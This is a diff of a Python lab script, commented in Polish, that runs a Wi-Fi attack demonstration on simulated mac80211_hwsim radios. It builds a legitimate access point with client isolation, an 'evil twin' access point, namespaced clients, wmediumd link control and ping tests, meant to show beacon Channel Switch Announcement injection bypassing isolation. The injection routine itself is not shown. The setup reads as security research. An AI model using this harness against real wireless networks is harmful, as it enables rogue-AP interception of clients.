@@ -1,75 +1,78 @@
 #!/usr/bin/env python3
 """
-Direct hwsim CSA Injection Test — NO Mininet-WiFi dependency
-=============================================================
-
-Architecture:
-    mac80211_hwsim (radios=4+)
-    ├── Radio 0 → hostapd (AP, channel 6, PMF=required)
-    ├── Radio 1 → wpa_supplicant (STA, connects to Radio 0)
-    ├── Radio 2 → monitor mode (scapy Beacon CSA injection)
-    └── wmediumd → channel separation model
-
-Key difference from Mininet-WiFi approach:
-    - Real 802.11 Auth/Assoc handshake through kernel (cfg80211/mac80211)
-    - Kernel tracks association → cfg80211_ch_switch_notify() fires on CSA
-    - wmediumd enforces channel separation → station loses connectivity on switch
-
-Usage:
-    sudo python3 raport/direct_hwsim_csa.py
-    sudo python3 raport/direct_hwsim_csa.py --hostapd-ver 2.6
-    sudo python3 raport/direct_hwsim_csa.py --hostapd-ver 2.10 --no-wmediumd
-    sudo python3 raport/direct_hwsim_csa.py --evil-channel 11 --beacon-count 50
-
-Prerequisites on Kali VM:
-    - mac80211_hwsim kernel module
-    - hostapd (2.6 in /opt/hostapd-2.6/ or 2.10 system)
-    - wpa_supplicant (system)
-    - wmediumd (installed from ramonfontes/wmediumd, branch mininet-wifi)
-    - scapy (pip3 install scapy)
+demonstracja obejscia client isolation przez beacon csa na hwsim
+beacony subtype 8 nie sa chronione przez pmf, dzialaja na kazdym hostapd
+dwa klienty lacza sie do legalnego ap z ap_isolate=1, potem csa przerzuca je na evil twin bez izolacji
+dowod: ping miedzy klientami blokowany na legalnym ap, dziala na evil twin
 """
 
 import argparse
 import os
 import re
 import signal
+import shlex
+import socket
+import struct
 import subprocess
 import sys
 import time
+from dataclasses import dataclass
 from datetime import datetime
 from pathlib import Path
+from typing import Optional
 
-# ─── Constants ─────────────────────────────────────────────────────────────────
+# stale
 SSID = "CSA_Test_Lab"
 PASSPHRASE = "LabTest123!"
 LEGIT_CHANNEL = 6
 EVIL_CHANNEL = 11
-IFACE_AP = None   # discovered dynamically
-IFACE_STA = None
-IFACE_INJ = None
+CLIENT_NET = "10.10.0"
 
-# Paths
+# sciezki
 HOSTAPD_26_BIN = "/opt/hostapd-2.6/bin/hostapd"
 HOSTAPD_SYS_BIN = "/usr/sbin/hostapd"
-HOSTAPD_CLI = "/usr/sbin/hostapd_cli"
 WPAS_BIN = "/sbin/wpa_supplicant"
 WMEDIUMD_BIN = "/usr/bin/wmediumd"
+WMEDIUMD_SOCKET = "/var/run/wmediumd.sock"
+WSERVER_ERRPROB_UPDATE_REQUEST_TYPE = 9
+WSERVER_ERRPROB_UPDATE_RESPONSE_TYPE = 10
+WUPDATE_SUCCESS = 0
 
 RAPORT_DIR = Path(__file__).parent
 TMP_DIR = Path("/tmp/direct_hwsim_csa")
 TMP_DIR.mkdir(parents=True, exist_ok=True)
+PCAP_DIR = RAPORT_DIR / "pcaps" / "csa_injection"
+LOG_DIR = RAPORT_DIR / "logs"
 
-HOSTAPD_PID = None
-WPAS_PID = None
+IFACE_AP = None
+IFACE_INJ = None
+IFACE_CAPTURE = None
+IFACE_EVIL = None
+CLIENTS = []
+HOSTAPD_PROCS = []
+WPAS_PROCS = []
+TCPDUMP_PROCS = []
 WMEDIUMD_PID = None
 
 
-# ─── Helpers ───────────────────────────────────────────────────────────────────
+@dataclass
+class Client:
+    name: str
+    iface: str
+    ns: str
+    ip_addr: str
+    mac_addr: Optional[str] = None
+    wpa_conf: Optional[Path] = None
+    wpas_proc: Optional[subprocess.Popen] = None
+
+
+# pomoce
 def ts():
     return datetime.now().strftime("%H:%M:%S")
 
+
 def log(msg):
-    """Print with explicit CRLF so QTerminal does not stair-step lines."""
+    """wypisuje linie z jawnym crlf zeby terminal nie schodkowal"""
     text = str(msg).replace("\r\n", "\n").replace("\r", "\n")
     for line in text.split("\n"):
         if line:
@@ -78,22 +81,37 @@ def log(msg):
             sys.stdout.write("\r\n")
     sys.stdout.flush()
 
+
 def run(cmd, shell=True, capture=True, timeout=30):
-    """Run a shell command, return stdout or raise on failure."""
+    """uruchamia komende, zwraca (stdout, stderr, returncode) lub popen gdy capture=false"""
     if capture:
-        r = subprocess.run(cmd, shell=shell, capture_output=True, text=True,
-                           timeout=timeout)
+        r = subprocess.run(
+            cmd,
+            shell=shell,
+            capture_output=True,
+            text=True,
+            timeout=timeout,
+        )
         return r.stdout.strip(), r.stderr.strip(), r.returncode
-    else:
-        return subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
-                                stderr=subprocess.STDOUT, text=True)
+    return subprocess.Popen(
+        cmd,
+        shell=shell,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        text=True,
+    )
+
 
 def sudo(cmd, capture=True, timeout=30):
     return run(f"sudo {cmd}", capture=capture, timeout=timeout)
 
 
+def q(value):
+    return shlex.quote(str(value))
+
+
 def stop_process(proc, name, timeout=5):
-    """Terminate a background child without letting demo pipes hang."""
+    """zabija proces w tle bez zawieszania potokow demo"""
     if not proc or proc.poll() is not None:
         return
     log(f"Stopping {name}...")
@@ -104,40 +122,54 @@ def stop_process(proc, name, timeout=5):
         proc.kill()
         proc.wait(timeout=timeout)
 
+
 def cleanup():
-    """Stop all processes and unload hwsim."""
+    """zatrzymuje procesy, usuwa namespace, wyladowuje hwsim"""
     log("=== CLEANUP ===")
-    for pid_var, name in [(HOSTAPD_PID, "hostapd"), (WPAS_PID, "wpa_supplicant"),
-                           (WMEDIUMD_PID, "wmediumd")]:
-        if pid_var:
-            try:
-                os.kill(pid_var, signal.SIGTERM)
-                time.sleep(0.2)
-            except (ProcessLookupError, TypeError):
-                pass
+
+    for proc in TCPDUMP_PROCS:
+        stop_process(proc, "tcpdump")
+    for proc in WPAS_PROCS:
+        stop_process(proc, "wpa_supplicant")
+    for proc in HOSTAPD_PROCS:
+        stop_process(proc, "hostapd")
+
+    if WMEDIUMD_PID:
+        try:
+            os.kill(WMEDIUMD_PID, signal.SIGTERM)
+            time.sleep(0.2)
+        except (ProcessLookupError, TypeError):
+            pass
+
     subprocess.run(["sudo", "pkill", "-x", "hostapd"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     subprocess.run(["sudo", "pkill", "-f", "^/sbin/wpa_supplicant -i wlan"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.run(["sudo", "pkill", "-x", "wpa_supplicant"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     subprocess.run(["sudo", "pkill", "-x", "wmediumd"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     subprocess.run(["sudo", "pkill", "-x", "tcpdump"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+    for client in CLIENTS:
+        subprocess.run(["sudo", "ip", "netns", "delete", client.ns],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
     time.sleep(1)
     subprocess.run(["sudo", "modprobe", "-r", "mac80211_hwsim"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     log("Cleanup done.")
 
 
-# ─── Interface Discovery ──────────────────────────────────────────────────────
-def load_hwsim(radios=4):
-    """Load mac80211_hwsim and return list of interface names."""
+# wykrywanie interfejsow
+def load_hwsim(radios=6):
+    """laduje mac80211_hwsim, zwraca liste interfejsow w kolejnosci kernela"""
     sudo("modprobe -r mac80211_hwsim 2>/dev/null || true")
     time.sleep(0.5)
-    out, err, rc = sudo(f"modprobe mac80211_hwsim radios={radios}")
+    sudo(f"modprobe mac80211_hwsim radios={int(radios)}")
     time.sleep(1.5)
 
-    # Discover interfaces
     out, _, _ = sudo("iw dev 2>&1")
     ifaces = []
     for line in out.split("\n"):
@@ -148,42 +180,108 @@ def load_hwsim(radios=4):
     return ifaces
 
 
-def discover_roles(ifaces):
-    """Assign AP, STA, and Injection roles to interfaces."""
-    global IFACE_AP, IFACE_STA, IFACE_INJ
+def discover_roles(ifaces, client_count=2):
+    """przypisuje role: ap, klienty, injekcja, capture, evil twin"""
+    global IFACE_AP, IFACE_INJ, IFACE_CAPTURE, IFACE_EVIL, CLIENTS
 
-    # We need at least 3 interfaces
-    if len(ifaces) < 3:
-        raise RuntimeError(f"Need at least 3 hwsim radios, got {len(ifaces)}. "
-                           f"Run: sudo modprobe mac80211_hwsim radios=4")
+    min_without_capture = client_count + 3
+    if len(ifaces) < min_without_capture:
+        raise RuntimeError(
+            f"Need at least {min_without_capture} hwsim radios for {client_count} clients, "
+            f"got {len(ifaces)}. Use --radios {min_without_capture + 1}."
+        )
 
-    # Assign: first two for AP/STA, third for injection
     IFACE_AP = ifaces[0]
-    IFACE_STA = ifaces[1]
-    IFACE_INJ = ifaces[2]
+    client_ifaces = ifaces[1:1 + client_count]
+    IFACE_INJ = ifaces[1 + client_count]
 
-    log(f"AP  interface: {IFACE_AP}")
-    log(f"STA interface: {IFACE_STA}")
-    log(f"INJ interface: {IFACE_INJ} (monitor mode)")
+    if len(ifaces) >= client_count + 4:
+        IFACE_CAPTURE = ifaces[2 + client_count]
+        IFACE_EVIL = ifaces[3 + client_count]
+    else:
+        IFACE_CAPTURE = None
+        IFACE_EVIL = ifaces[2 + client_count]
 
-    return IFACE_AP, IFACE_STA, IFACE_INJ
+    CLIENTS = [
+        Client(
+            name=f"sta{i + 1}",
+            iface=iface,
+            ns=f"sta{i + 1}ns",
+            ip_addr=f"{CLIENT_NET}.{11 + i}",
+            mac_addr=get_iface_mac_root(iface),
+        )
+        for i, iface in enumerate(client_ifaces)
+    ]
+
+    log(f"AP interface:       {IFACE_AP}")
+    for client in CLIENTS:
+        log(f"{client.name} interface:     {client.iface} in {client.ns} ({client.ip_addr})")
+    log(f"Injection interface: {IFACE_INJ}")
+    log(f"Capture interface:   {IFACE_CAPTURE or 'shared/disabled'}")
+    log(f"Evil Twin interface: {IFACE_EVIL}")
+
+    return IFACE_AP, CLIENTS, IFACE_INJ, IFACE_CAPTURE, IFACE_EVIL
 
 
-# ─── wmediumd ──────────────────────────────────────────────────────────────────
-def generate_wmediumd_config(ifaces):
-    """Generate wmediumd config with all interfaces' MAC addresses."""
+def get_phy_for_iface(iface):
+    out, _, _ = sudo(f"iw dev {q(iface)} info 2>&1")
+    m = re.search(r"wiphy\s+(\d+)", out)
+    if not m:
+        raise RuntimeError(f"Could not find wiphy for {iface}: {out[:200]}")
+    return f"phy{m.group(1)}"
+
+
+# network namespace
+def setup_client_namespaces(clients):
+    """przenosi kazde radio klienta do osobnego namespace dla ping testow"""
+    for client in clients:
+        sudo(f"ip netns delete {q(client.ns)} 2>/dev/null || true")
+        sudo(f"ip netns add {q(client.ns)}")
+
+        phy = get_phy_for_iface(client.iface)
+        sudo(f"ip link set {q(client.iface)} down 2>/dev/null || true")
+        log(f"Moving {client.iface} ({phy}) into namespace {client.ns}")
+        sudo(f"iw phy {q(phy)} set netns name {q(client.ns)}")
+        time.sleep(0.4)
+
+        client_cmd(client, "ip link set lo up")
+        client_cmd(client, f"ip link set {q(client.iface)} up")
+
+
+def client_cmd(client, cmd, capture=True, timeout=30):
+    return sudo(f"ip netns exec {q(client.ns)} {cmd}", capture=capture, timeout=timeout)
+
+
+# wmediumd
+def get_iface_mac_root(iface):
+    out, _, _ = run(f"ip -c=never link show {q(iface)}")
+    m = re.search(r"link/ether ([0-9a-f:]+)", out)
+    return m.group(1) if m else "02:00:00:00:00:00"
+
+
+def generate_wmediumd_config(ifaces, error_prob_model=False):
     ids_lines = []
     for iface in ifaces:
-        out, _, _ = run(f"ip -c=never link show {iface}")
-        m = re.search(r'link/ether ([0-9a-f:]+)', out)
-        mac = m.group(1) if m else "02:00:00:00:00:00"
+        mac = get_iface_mac_root(iface)
         ids_lines.append(f'\t\t"{mac}"')
-    
+
+    joined_ids = ",\n".join(ids_lines)
+    model = ""
+    if error_prob_model:
+        model = """
+ model :
+ {
+     type = "prob";
+     default_prob = 0.0;
+ };
+"""
+
     config = f"""ifaces : {{
-    ids = [
-{",\n".join(ids_lines)}
-    ];
-}};
+     ids = [
+ {joined_ids}
+     ];
+ }};
+ {model}
 """
     cfg_path = "/tmp/wmediumd.cfg"
     with open(cfg_path, "w") as f:
@@ -192,51 +290,126 @@ def generate_wmediumd_config(ifaces):
     return cfg_path
 
 
-def start_wmediumd(ifaces):
-    """Start wmediumd for channel separation."""
+def start_wmediumd(ifaces, server=False, error_prob_model=False):
     global WMEDIUMD_PID
 
-    # Check if wmediumd exists
-    out, _, rc = run("which wmediumd 2>/dev/null || echo NOT_FOUND")
+    out, _, _ = run("which wmediumd 2>/dev/null || echo NOT_FOUND")
     if "NOT_FOUND" in out:
-        log("wmediumd not found — skipping channel separation")
+        log("wmediumd not found; skipping channel separation")
         return False
 
-    # Generate config
-    generate_wmediumd_config(ifaces)
-
-    # Kill any existing wmediumd
-    sudo("pkill -f wmediumd 2>/dev/null || true")
+    cfg_path = generate_wmediumd_config(ifaces, error_prob_model=error_prob_model)
+    sudo("pkill -x wmediumd 2>/dev/null || true")
+    sudo(f"rm -f {q(WMEDIUMD_SOCKET)} 2>/dev/null || true")
     time.sleep(0.5)
 
-    log("Starting wmediumd...")
-    proc = run(f"{WMEDIUMD_BIN} -c /tmp/wmediumd.cfg 2>&1", capture=False)
+    args = ["sudo", WMEDIUMD_BIN, "-c", cfg_path, "-l", "6"]
+    if server:
+        args.append("-s")
+    log(f"Starting wmediumd{' server' if server else ''}...")
+    logfile = TMP_DIR / "wmediumd.log"
+    proc = subprocess.Popen(
+        args,
+        stdout=open(str(logfile), "w"),
+        stderr=subprocess.STDOUT,
+    )
     WMEDIUMD_PID = proc.pid
     time.sleep(1)
 
-    # Check if running
     out, _, _ = run("pgrep wmediumd 2>/dev/null || echo NOT_RUNNING")
     if "NOT_RUNNING" in out:
         log("WARNING: wmediumd may not have started")
+        if logfile.exists():
+            log(logfile.read_text(errors="replace")[:2000])
         return False
 
-    log(f"wmediumd running (PID={WMEDIUMD_PID})")
+    if server:
+        deadline = time.monotonic() + 5
+        while time.monotonic() < deadline:
+            if os.path.exists(WMEDIUMD_SOCKET):
+                break
+            time.sleep(0.2)
+        if not os.path.exists(WMEDIUMD_SOCKET):
+            log(f"WARNING: wmediumd server socket not found: {WMEDIUMD_SOCKET}")
+            if logfile.exists():
+                log(logfile.read_text(errors="replace")[:2000])
+            return False
+
+    log(f"wmediumd running (PID={WMEDIUMD_PID}, server={'yes' if server else 'no'})")
     return True
 
 
-def stop_wmediumd():
-    global WMEDIUMD_PID
-    if WMEDIUMD_PID:
-        try:
-            os.kill(WMEDIUMD_PID, signal.SIGTERM)
-        except (ProcessLookupError, TypeError):
-            pass
-    sudo("pkill -f wmediumd 2>/dev/null || true")
+def mac_to_bytes(mac):
+    return bytes(int(part, 16) for part in mac.split(":"))
 
 
-# ─── hostapd ───────────────────────────────────────────────────────────────────
-def write_hostapd_conf(iface, channel, pmf=2):
-    """Generate temporary hostapd.conf for the test."""
+def errprob_to_fixed_point(errprob):
+    errprob = max(0.0, min(float(errprob), 1.0))
+    before = int(errprob)
+    after = int((errprob - before) * (1 << 31))
+    return ((before << 31) + after) & 0xffffffff
+
+
+def wmediumd_errprob_update(from_mac, to_mac, errprob=1.0):
+    """aktualizuje prawdopodobienstwo utraty lacza w wmediumd server przez gniazdo unix"""
+    payload = struct.pack(
+        "!B6s6sI",
+        WSERVER_ERRPROB_UPDATE_REQUEST_TYPE,
+        mac_to_bytes(from_mac),
+        mac_to_bytes(to_mac),
+        errprob_to_fixed_point(errprob),
+    )
+    with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as sock:
+        sock.settimeout(5)
+        sock.connect(WMEDIUMD_SOCKET)
+        sock.sendall(payload)
+        response_type = sock.recv(1)
+        if response_type != bytes([WSERVER_ERRPROB_UPDATE_RESPONSE_TYPE]):
+            got = response_type[0] if response_type else "none"
+            raise RuntimeError(f"unexpected wmediumd response type: {got}")
+        rest = sock.recv(18)
+        if len(rest) != 18:
+            raise RuntimeError(f"short wmediumd response: {len(rest)} bytes")
+        _, _, _, _, update_result = struct.unpack("!B6s6sIB", rest)
+        return update_result
+
+
+def apply_wmediumd_loss_after_csa(ap_mac, clients):
+    """modeluje separacje kanalow po csa przez odciecie laczy legalny ap <-> sta"""
+    if not os.path.exists(WMEDIUMD_SOCKET):
+        return False, f"socket missing: {WMEDIUMD_SOCKET}"
+
+    updates = []
+    try:
+        for client in clients:
+            if not client.mac_addr:
+                return False, f"{client.name} missing MAC"
+            for src, dst in [(ap_mac, client.mac_addr), (client.mac_addr, ap_mac)]:
+                rc = wmediumd_errprob_update(src, dst, errprob=1.0)
+                label = f"{src}->{dst}:rc={rc}"
+                updates.append(label)
+                if rc != WUPDATE_SUCCESS:
+                    return False, "; ".join(updates)
+    except Exception as exc:
+        return False, f"{type(exc).__name__}: {exc}; updates={'; '.join(updates)}"
+
+    return True, "; ".join(updates)
+
+
+# hostapd
+def hostapd_bin(hostapd_ver):
+    bin_path = HOSTAPD_26_BIN if hostapd_ver == "2.6" else HOSTAPD_SYS_BIN
+    if not os.path.exists(bin_path):
+        log(f"WARNING: {bin_path} not found, trying system hostapd")
+        bin_path = HOSTAPD_SYS_BIN
+    if not os.path.exists(bin_path):
+        raise RuntimeError("No hostapd binary found")
+    return bin_path
+
+
+def write_hostapd_conf(iface, channel, pmf=2, ap_isolate=None, ctrl_dir="/var/run/hostapd", name="hostapd.conf"):
+    """generuje tymczasowy hostapd.conf dla legalnego ap lub evil twin"""
+    isolate_line = "" if ap_isolate is None else f"ap_isolate={1 if ap_isolate else 0}\n"
     conf = f"""interface={iface}
 driver=nl80211
 ssid={SSID}
@@ -248,67 +421,59 @@ wpa_key_mgmt=WPA-PSK
 wpa_pairwise=CCMP
 rsn_pairwise=CCMP
 ieee80211w={pmf}
-beacon_int=100
+{isolate_line}beacon_int=100
 dtim_period=2
-ctrl_interface=/var/run/hostapd
+ctrl_interface={ctrl_dir}
 ctrl_interface_group=0
 logger_stdout=-1
 logger_stdout_level=2
 """
-    conf_path = TMP_DIR / "hostapd.conf"
+    conf_path = TMP_DIR / name
     conf_path.write_text(conf)
     return conf_path
 
 
-def start_hostapd(iface, channel, hostapd_ver="2.10"):
-    """Start hostapd on the given interface."""
-    global HOSTAPD_PID
-
-    conf_path = write_hostapd_conf(iface, channel)
-
-    # Select hostapd binary
-    if hostapd_ver == "2.6":
-        bin_path = HOSTAPD_26_BIN
-    else:
-        bin_path = HOSTAPD_SYS_BIN
-
-    if not os.path.exists(bin_path):
-        log(f"WARNING: {bin_path} not found, trying system hostapd")
-        bin_path = HOSTAPD_SYS_BIN
-    if not os.path.exists(bin_path):
-        raise RuntimeError("No hostapd binary found")
-
-    log(f"Starting hostapd {hostapd_ver} on {iface} (channel {channel})...")
-    # Redirect output to log file for debugging
-    logfile = TMP_DIR / "hostapd.log"
-    proc = subprocess.Popen(
-        f"sudo {bin_path} {conf_path}",
-        shell=True, stdout=open(str(logfile), "w"),
-        stderr=subprocess.STDOUT
+def start_hostapd(iface, channel, hostapd_ver="2.10", pmf=2, ap_isolate=None, name="hostapd", ctrl_dir="/var/run/hostapd"):
+    conf_path = write_hostapd_conf(
+        iface=iface,
+        channel=channel,
+        pmf=pmf,
+        ap_isolate=ap_isolate,
+        ctrl_dir=ctrl_dir,
+        name=f"{name}.conf",
     )
-    HOSTAPD_PID = proc.pid
+    bin_path = hostapd_bin(hostapd_ver)
+    logfile = TMP_DIR / f"{name}.log"
+
+    isolate_desc = "default" if ap_isolate is None else str(int(bool(ap_isolate)))
+    log(f"Starting {name} on {iface} (channel {channel}, PMF={pmf}, ap_isolate={isolate_desc})...")
+    proc = subprocess.Popen(
+        ["sudo", bin_path, str(conf_path)],
+        stdout=open(str(logfile), "w"),
+        stderr=subprocess.STDOUT,
+    )
+    HOSTAPD_PROCS.append(proc)
     time.sleep(3)
 
-    # Verify hostapd via iw (more reliable than hostapd_cli)
-    out, _, _ = sudo(f"iw dev {iface} info 2>&1")
+    out, _, _ = sudo(f"iw dev {q(iface)} info 2>&1")
     if "type AP" in out:
-        log(f"hostapd ENABLED on {iface}")
+        log(f"{name} ENABLED on {iface}")
     else:
-        log(f"WARNING: hostapd may not be fully started")
+        log(f"WARNING: {name} may not be fully started")
         log(f"  iw info: {out[:200]}")
 
-    return HOSTAPD_PID
+    return proc
 
 
-# ─── wpa_supplicant ───────────────────────────────────────────────────────────
-def write_wpa_conf(iface, pmf=2):
-    """Generate temporary wpa_supplicant.conf."""
+# wpa_supplicant i stan STA
+def write_wpa_conf(client, pmf=1):
+    """generuje per-client wpa_supplicant.conf"""
     conf = f"""ctrl_interface=/var/run/wpa_supplicant
 update_config=1
 country=PL
 network={{
-    ssid="{SSID}"
-    psk="{PASSPHRASE}"
+    ssid=\"{SSID}\"
+    psk=\"{PASSPHRASE}\"
     proto=RSN
     key_mgmt=WPA-PSK
     pairwise=CCMP
@@ -316,63 +481,83 @@ network={{
     ieee80211w={pmf}
 }}
 """
-    conf_path = TMP_DIR / "wpa_supplicant.conf"
+    conf_path = TMP_DIR / f"wpa_supplicant_{client.name}.conf"
     conf_path.write_text(conf)
+    client.wpa_conf = conf_path
     return conf_path
 
 
-def start_wpa_supplicant(iface, pmf=2):
-    """Start wpa_supplicant on the given STA interface."""
-    global WPAS_PID
+def start_wpa_supplicant(client, pmf=1):
+    conf_path = write_wpa_conf(client, pmf)
+    client_cmd(client, f"iw dev {q(client.iface)} disconnect 2>/dev/null || true")
+    client_cmd(client, f"rm -f /var/run/wpa_supplicant/{q(client.iface)} 2>/dev/null || true")
 
-    conf_path = write_wpa_conf(iface, pmf)
-
-    # Clear any leftover state
-    sudo(f"iw dev {iface} disconnect 2>/dev/null || true")
-    sudo(f"rm -f /var/run/wpa_supplicant/{iface} 2>/dev/null || true")
-
-    log(f"Starting wpa_supplicant on {iface}...")
-    logfile = TMP_DIR / "wpa_supplicant.log"
+    log(f"Starting wpa_supplicant for {client.name} on {client.iface} (STA PMF={pmf})...")
+    logfile = TMP_DIR / f"wpa_supplicant_{client.name}.log"
     proc = subprocess.Popen(
-        f"sudo {WPAS_BIN} -i {iface} -c {conf_path} -D nl80211",
-        shell=True, stdout=open(str(logfile), "w"),
-        stderr=subprocess.STDOUT
+        [
+            "sudo", "ip", "netns", "exec", client.ns,
+            WPAS_BIN, "-i", client.iface, "-c", str(conf_path), "-D", "nl80211",
+        ],
+        stdout=open(str(logfile), "w"),
+        stderr=subprocess.STDOUT,
     )
-    WPAS_PID = proc.pid
+    client.wpas_proc = proc
+    WPAS_PROCS.append(proc)
     time.sleep(3)
+    return proc
 
-    return WPAS_PID
+
+def parse_link(out):
+    if "Connected to" not in out:
+        return False, None, None
+    bssid = None
+    freq = None
+    for line in out.split("\n"):
+        line = line.strip()
+        if line.startswith("Connected to"):
+            parts = line.split()
+            if len(parts) >= 3:
+                bssid = parts[2]
+        elif line.startswith("freq:"):
+            parts = line.split()
+            if len(parts) >= 2:
+                freq = parts[1]
+    return True, bssid, freq
 
 
-def check_association(iface, timeout=15):
-    """Wait for real 802.11 association. Returns (associated, bssid, freq)."""
-    log(f"Waiting for association on {iface} (max {timeout}s)...")
+def check_association(client, timeout=15, expected_bssid=None):
+    """czeka na asocjacje, zwraca (associated, bssid, freq)"""
+    label = f"{client.name}/{client.iface}"
+    log(f"Waiting for association on {label} (max {timeout}s)...")
     deadline = time.time() + timeout
+    expected = expected_bssid.lower() if expected_bssid else None
 
     while time.time() < deadline:
-        out, _, _ = sudo(f"iw dev {iface} link")
-        if "Connected to" in out:
-            # Parse BSSID and frequency
-            bssid = None
-            freq = None
-            for line in out.split("\n"):
-                if "Connected to" in line:
-                    bssid = line.strip().split()[-1]
-                if "freq:" in line:
-                    freq = line.strip().split()[-1]
-            log(f"ASSOCIATED: BSSID={bssid}, freq={freq}")
+        out, _, _ = client_cmd(client, f"iw dev {q(client.iface)} link")
+        associated, bssid, freq = parse_link(out)
+        if associated and (expected is None or (bssid or "").lower() == expected):
+            log(f"ASSOCIATED {client.name}: BSSID={bssid}, freq={freq}")
             return True, bssid, freq
-
         time.sleep(1)
 
-    out, _, _ = sudo(f"iw dev {iface} link")
-    log(f"Association timeout. Status: {out[:200]}")
+    out, _, _ = client_cmd(client, f"iw dev {q(client.iface)} link")
+    log(f"Association timeout for {client.name}. Status: {out[:240]}")
     return False, None, None
 
 
-def get_sta_channel(iface):
-    """Get current channel of a station interface."""
-    out, _, _ = sudo(f"iw dev {iface} info")
+def check_all_associated(clients, timeout=30, expected_bssid=None):
+    started = time.monotonic()
+    results = {}
+    for client in clients:
+        remaining = max(3, int(timeout - (time.monotonic() - started)))
+        associated, bssid, freq = check_association(client, timeout=remaining, expected_bssid=expected_bssid)
+        results[client.name] = {"associated": associated, "bssid": bssid, "freq": freq}
+    return all(r["associated"] for r in results.values()), results, time.monotonic() - started
+
+
+def get_sta_channel(client):
+    out, _, _ = client_cmd(client, f"iw dev {q(client.iface)} info")
     for line in out.split("\n"):
         if "channel" in line:
             try:
@@ -382,354 +567,646 @@ def get_sta_channel(iface):
     return None
 
 
-# ─── CSA Injection ─────────────────────────────────────────────────────────────
+def wait_for_clients_channel(clients, target_channel, timeout=15, poll_interval=1.0):
+    started = time.monotonic()
+    deadline = started + timeout
+    channels = {client.name: None for client in clients}
+
+    while time.monotonic() < deadline:
+        for client in clients:
+            channels[client.name] = get_sta_channel(client)
+        elapsed = time.monotonic() - started
+        status = ", ".join(f"{name}=ch{ch}" for name, ch in channels.items())
+        log(f"  Poll: {status} after {elapsed:.1f}s")
+        if all(ch == target_channel for ch in channels.values()):
+            return True, channels, elapsed
+        time.sleep(poll_interval)
+
+    return False, channels, time.monotonic() - started
+
+
+def assign_client_ips(clients):
+    for client in clients:
+        client_cmd(client, f"ip addr flush dev {q(client.iface)}")
+        client_cmd(client, f"ip addr add {q(client.ip_addr + '/24')} dev {q(client.iface)}")
+        client_cmd(client, f"ip link set {q(client.iface)} up")
+        log(f"IP assigned: {client.name} {client.iface} -> {client.ip_addr}/24")
+
+
+# przechwytywanie pakietow
+def start_tcpdump(label, iface, pcap_tmp, monitor=False, bpf=None):
+    if not iface:
+        return None
+    cmd = ["sudo", "tcpdump", "-i", iface, "-w", str(pcap_tmp), "-s", "0"]
+    if monitor:
+        cmd.append("-I")
+    if bpf:
+        cmd.extend(shlex.split(bpf))
+
+    log(f"tcpdump[{label}] -> {pcap_tmp} on {iface}")
+    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    TCPDUMP_PROCS.append(proc)
+    time.sleep(1)
+    return proc
+
+
+def stop_tcpdump(proc, label):
+    stop_process(proc, f"tcpdump[{label}]")
+
+
+def copy_pcap(pcap_tmp, pcap_final):
+    pcap_final.parent.mkdir(parents=True, exist_ok=True)
+    if pcap_tmp and os.path.exists(pcap_tmp) and os.path.getsize(pcap_tmp) > 24:
+        subprocess.run(["sudo", "cp", str(pcap_tmp), str(pcap_final)], capture_output=True)
+        subprocess.run(["sudo", "chmod", "a+r", str(pcap_final)], capture_output=True)
+        size = os.path.getsize(pcap_tmp)
+        log(f"PCAP saved: {pcap_final} ({size} bytes)")
+        return str(pcap_final)
+    log(f"PCAP empty/missing: {pcap_tmp}")
+    return None
+
+
+# dowod ping
+def ping_client_to_client(src, dst, count=5, wait=2):
+    cmd = f"ping -c {int(count)} -W {int(wait)} {q(dst.ip_addr)}"
+    out, err, rc = client_cmd(src, cmd, timeout=count * wait + 10)
+    combined = "\n".join(part for part in [out, err] if part)
+    log(f"PING {src.name} -> {dst.name} ({dst.ip_addr}) rc={rc}")
+    log(combined or "<no ping output>")
+
+    received = 0
+    m = re.search(r",\s*(\d+)\s+received", combined)
+    if m:
+        received = int(m.group(1))
+    success = received > 0 and "100% packet loss" not in combined
+    return success, combined
+
+
+def run_ping_phase(label, src, dst, expect_success, capture_iface, ts_str, capture_enabled=True):
+    log(f"\n=== {label} PING TEST: {src.name} -> {dst.name} ===")
+    tmp = f"/tmp/{label.lower()}_{ts_str}.pcap"
+    final = PCAP_DIR / f"{label.lower()}_{ts_str}.pcap"
+    proc = None
+    if capture_enabled:
+        proc = start_tcpdump(label, capture_iface, tmp, monitor=False, bpf="arp or icmp")
+    else:
+        log(f"tcpdump[{label}] skipped because --capture-ping is disabled")
+    success, output = ping_client_to_client(src, dst)
+    pcap = None
+    if proc:
+        stop_tcpdump(proc, label)
+        pcap = copy_pcap(tmp, final)
+
+    if success == expect_success:
+        marker = f"{label}_PASS"
+        if expect_success:
+            log(f"{marker}: ping succeeded as expected.")
+        else:
+            log(f"{marker}: ping blocked as expected by client isolation.")
+        return True, success, output, pcap
+
+    marker = f"{label}_FAIL"
+    expected = "success" if expect_success else "block"
+    observed = "success" if success else "block"
+    log(f"{marker}: expected {expected}, observed {observed}.")
+    return False, success, output, pcap
+
+
+# csa injection
 def setup_monitor_mode(iface, channel):
-    """Put interface in monitor mode on specified channel."""
-    sudo(f"ip link set {iface} down")
-    sudo(f"iw dev {iface} set type monitor")
-    sudo(f"ip link set {iface} up")
-    sudo(f"iw dev {iface} set channel {channel}")
+    sudo(f"ip link set {q(iface)} down")
+    sudo(f"iw dev {q(iface)} set type monitor")
+    sudo(f"ip link set {q(iface)} up")
+    sudo(f"iw dev {q(iface)} set channel {int(channel)}")
     log(f"{iface} in monitor mode, channel {channel}")
 
 
 def get_ap_mac(ap_iface):
-    """Get MAC address of AP interface."""
-    out, _, _ = run(f"ip -c=never link show {ap_iface}")
-    m = re.search(r'link/ether ([0-9a-f:]+)', out)
+    out, _, _ = run(f"ip -c=never link show {q(ap_iface)}")
+    m = re.search(r"link/ether ([0-9a-f:]+)", out)
     return m.group(1) if m else "02:00:00:00:00:00"
 
 
